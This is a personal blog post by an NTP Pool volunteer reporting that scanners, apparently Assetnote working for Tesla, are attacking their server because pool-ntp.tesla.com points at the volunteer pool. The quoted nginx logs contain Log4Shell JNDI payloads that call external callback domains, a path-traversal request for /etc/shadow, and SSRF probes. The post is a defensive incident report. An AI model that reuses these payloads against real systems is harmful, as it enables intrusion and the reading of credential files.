---
title: I'm being cyberattacked by Tesla, Inc
link: https://dreamstation.systems/personal/tesla.html
source: hnrss-org-frontpage
published: 2026-09-13T18:03:09Z
updated: 2026-09-13T18:03:09Z
first_seen: 2026-09-13T19:20:48.145884900Z
authors:
- robinpie
summary: 'Article URL: https://dreamstation.systems/personal/tesla.html Comments URL: https://news.ycombinator.com/item?id=49686766 Points: 214 # Comments: 51'
content: extracted
html: 2026-09-13-i-m-being-cyberattacked-by-tesla-inc.html
---

While it’s not unusual for everything on the dark dungeons of the IPv4 Internet to be subject to a barrage of drive-by scanner traffic and the occasional bizarrely persistent attacker, I noticed something strange while looking through my nginx logs. Persistent attack traffic coming from three particular IPs, with the strange thing being that they were arriving with `Host` or `Referer` headers from `pool-ntp.tesla.com`, carried Assetnote user agents, and were trying to SSRF me to Assetnote callback URLs:

```
35.168.63.24 - - [13/Sep/2026:01:14:31 -0700] "GET /?a=%3Cscript%20src=${jndi${:-:}ldap${:-:}//waf6.${date:MM-dd-yyyy}.pool-ntp.tesla.com.log4j.assetnote-callback.com/}>alert()%3C%2Fscript%3E HTTP/1.1" 299 817 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 ${jndi${:-:}ldap${:-:}//waf6.${date:MM-dd-yyyy}.pool-ntp.tesla.com.log4j.assetnote-callback.com/}" host=pool-ntp.tesla.com
```

The traffic came from three specific scanners: `54.165.75.96`, `35.168.63.24`, and `52.44.200.251`. All of those are in the Amazon Web Services AS (AMAZON-AES).

Assetnote, a legitimate attack surface management tool now called Searchlight Cyber in marketing materials, does indeed use continuous threat exposure scanners like this to perform automated checks for customers’ assets. Assuming this is actual Assetnote traffic (they do indeed use AWS, so that checks out), they must be mistaking me for an internal Tesla asset.

## How this happened

Tesla publishes `pool-ntp.tesla.com` as a CNAME to `pool.ntp.org`. `pool.ntp.org` is the [NTP Pool](https://www.ntppool.org/), a round‐robin of volunteer NTP servers that [I’m a part of](https://dreamstation.systems/personal/ntpuserinfo.html). (Sidenote, they should be using a vendor zone, not their own CNAME under `tesla.com`.)

Speculation: Assetnote pulled in everything it could find under `tesla.com`, including `pool-ntp.tesla.com`, which CNAMEs to `pool.ntp.org`, which can resolve to my machine — `67.215.249.229`. The asset inventory saves this as a Tesla asset, and starts throwing exploits at me, a stranger.

I emailed Tesla about this, and haven’t heard back yet:

> Hi,
>
> Not a vuln in Tesla, and I'm not asking for anything, but I just wanted to let you know that you may unintentionally be being a nuisance.
>
> My server is a member of the NTP Pool. Over roughly the past two days, it has received ~8,000 requests from two of your scanning hosts: <54.165.75.96> and <35.168.63.24>, UA \<Assetnote/1.0.0 (ExposureScan)>, with many templated exploit payloads.
>
> Every payload used \<pool-ntp.tesla.com> as the target hostname. I assume you have an internal subdomain that resolves round‐robin onto NTP Pool member servers, the vast majority of which are not owned by Tesla. Your asset discovery appears to be unintentionally including every IP that \<pool-ntp.tesla.com> can resolve to as in‐scope for active scanning.
>
> No harm caused here, but I wanted to warn you that \*\*you are throwing exploits at strangers’ IPs\*\*.
>
> Happy to share verbatim logs if useful.
>
> Robin\
>  dreamstation.systems / 67.215.249.229

## Their traffic

They tried all kinds of exploits against me: path traversal, webshell uploads, probing software internals, probing WordPress and other CMS management endpoints, SSRF, Log4Shell, and a lot more.

There were also callback attempts. 989 requests embedded `assetnote-callback.com` hostnames for Log4Shell and Text4Shell detection, and 114 named `canary.assetnotessrf.com` for SSRF:

```
GET /solr/admin/collections?action=${jndi:ldap://solr.${hostName}.${date:MM-dd-yyyy}.pool-ntp.tesla.com.log4j.assetnote-callback.com/a}
```

Something funny that I don’t have an explanation for is that fifteen requests carried a Host header `login.solarcity.com`, all requesting `GET /(S(x))/b/(S(x))in/System.Web.Mvc.dll`, which I think is some sort of ASP.NET trick trying to resolve `/b/(S(x))in/` to `/bin/`.

I found some other amusing information outside of the `Host` header. Sweeping the Referer headers, URLs, and query strings turns up hostnames baked into the templates themselves, like this:

```
GET /calendars/admin@lowlevelaccess.jlg.com/calendar/../../../mail/lowlevelaccess.jlg.com/admin/.x-attachment-1-y/new/../../../../../../../../../etc/shadow
```

Other third‐party hostnames I noticed included `servicemcdonalds.com`, `saferas.com`, `rsmafghanistan.af`, `enrichcs.com.au`, `escience2010.org`, `al-forno.com.au`, and `disneyfineart.com`.

An RFC 1918 address also appears in the Referer of one probe:

```
GET /internal/v2/config/mps_secret/ADM_SESSIONID
Referer: http://192.168.178.222/admin_ui/mas/ent/html/main.html
```

The scanner also tries to talk HTTP at every port it finds for some reason. My SSH, Postfix, and Dovecot have gotten tons of junk HTTP traffic.

On September 8, I started answering the `pool-ntp.tesla.com` Host with non‐standard status code 299 (to hopefully catch the attention of a human reading the scanner logs), with a body of this notice on every path:

> \# This is not Tesla infrastructure!
>
> This is a hobbyist NTP, web, and miscellaneous server.
>
> Over the past few days, I have been receiving tons of requests at the pool-ntp.tesla.com Host from two Assetnote scanning hosts (54.165.75.96 and 35.168.63.24).
>
> pool-ntp.tesla.com CNAMEs to pool.ntp.org, which round-robins to thousands of volunteer NTP servers, and your scanner seems to have gotten stuck to my server.
>
> You have not caused me any harm, but you are throwing exploits at strangers' IPs.
>
> I have emailed VulnerabilityReporting@tesla.com about this. If you would like, email me back at robin@dreamstation.systems and I can provide detailed logs.

It has unfortunately not seemed to change the behavior so far.

None of their attacks have succeeded, which I’m proud of.

Since August 21, I’ve gotten over 50,000 requests from Assetnote hosts. The traffic has not stopped yet; I will update this post in the future.

(Yes, I could just firewall out their IPs, but it’s very fun to observe this, and I want to make someone at Tesla aware of what’s going on.)

## Are they doing this to the entire pool?

I asked the NTP Pool server operator community board if anyone else who happens to run a web server on the same IP as their NTP server is seeing this. One operator, Matt Nordhoff, said he had also been seeing this since August 15:

```
$ sudo rg -zFI pool-ntp.tesla.com access.log* | awk '{print $1}' | sort | uniq -c | sort -gr | head
   9126 54.165.75.96
   7461 35.168.63.24
   6123 52.44.200.251
     11 64.227.103.50
      6 146.190.142.16
      4 3.101.230.148
      3 3.88.188.142
      3 3.101.216.68
      2 54.213.2.72
      2 54.202.10.40
```

but nobody else has said anything. I am wondering if they are re‐resolving `pool-ntp.tesla.com` every single time and hitting everything the geolocation magic will let them reach, or if they just collected a few pool IPs and are only hammering those.
